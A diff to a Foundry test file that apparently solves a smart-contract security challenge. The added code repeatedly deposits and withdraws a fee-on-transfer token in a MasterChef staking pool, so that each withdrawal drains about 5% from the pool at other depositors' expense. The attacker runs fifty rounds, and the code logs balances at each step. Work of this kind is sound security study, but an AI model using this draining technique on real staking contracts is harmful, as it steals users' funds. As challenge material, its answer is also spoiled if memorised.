@@ -36,10 +36,11 @@ contract InflationaryNetWorthTest is Test {
     // Reward token
     muny = new Token("MUNY", "MUNY");
 
+    uint256 munyPerBlock = 1e18;
     masterChef = new MasterChef(
       IMuny(address(muny)),
       address(this),
-      1e18,
+      munyPerBlock,
       block.number,
       block.number
     );
@@ -47,12 +48,16 @@ contract InflationaryNetWorthTest is Test {
     muny.transferOwnership(address(masterChef));
 
     // Start MULA staking
-    masterChef.add(1000, IERC20(mula), false);
+    uint256 allocPoint = 1000;
+    masterChef.add(allocPoint, IERC20(mula), false);
 
     vm.startPrank(user);
     mula.approve(address(masterChef), type(uint256).max);
     masterChef.deposit(0, 10_000e18);
     vm.stopPrank();
+
+    assertEq(mula.balanceOf(address(masterChef)), 10_000e18 * 95 / 100);
+    assertEq(muny.balanceOf(attacker), 0);
 
     vm.prank(attacker);
     mula.approve(address(masterChef), type(uint256).max);
@@ -64,6 +69,31 @@ contract InflationaryNetWorthTest is Test {
   function testExploit() public {
     // Exploit start
     vm.startPrank(attacker, attacker);
+
+    uint256 myBalance = mula.balanceOf(attacker);
+
+    // Staking pool loses 5% of total deposited
+    // amount each time attacker withdraws his deposit
+
+    for (uint256 i; i < 50; ++i) {
+      console2.log("%d before deposit, pendingMuny(attacker)", i, masterChef.pendingMuny(0, attacker));
+      console2.log("%d before deposit, pendingMuny(user)", i, masterChef.pendingMuny(0, user));
+      masterChef.deposit(0, myBalance);
+      console2.log("%d deposit(%d): mula.balanceOf(attacker)", i, myBalance, mula.balanceOf(attacker));
+      console2.log("%d deposit(%d): mula.balanceOf(address(masterChef))", i, myBalance, mula.balanceOf(address(masterChef)));
+      console2.log("%d deposit(%d): muny.balanceOf(attacker)", i, myBalance, muny.balanceOf(attacker));
+      // vm.roll(block.number + 1);
+      console2.log("%d after deposit, pendingMuny(attacker)", i, masterChef.pendingMuny(0, attacker));
+      console2.log("%d after deposit, pendingMuny(user)", i, masterChef.pendingMuny(0, user));
+      masterChef.withdraw(0, myBalance);
+      console2.log("%d withdraw(%d): mula.balanceOf(attacker)", i, myBalance, mula.balanceOf(attacker));
+      console2.log("%d withdraw(%d): mula.balanceOf(address(masterChef))", i, myBalance, mula.balanceOf(address(masterChef)));
+      console2.log("%d withdraw(%d): muny.balanceOf(attacker)", i, myBalance, muny.balanceOf(attacker));
+      console2.log("%d after withdraw, pendingMuny(attacker)", i, masterChef.pendingMuny(0, attacker));
+      console2.log("%d after withdraw, pendingMuny(user)", i, masterChef.pendingMuny(0, user));
+
+      myBalance = myBalance * 95 / 100;
+    }
 
     vm.stopPrank();
     // Exploit end
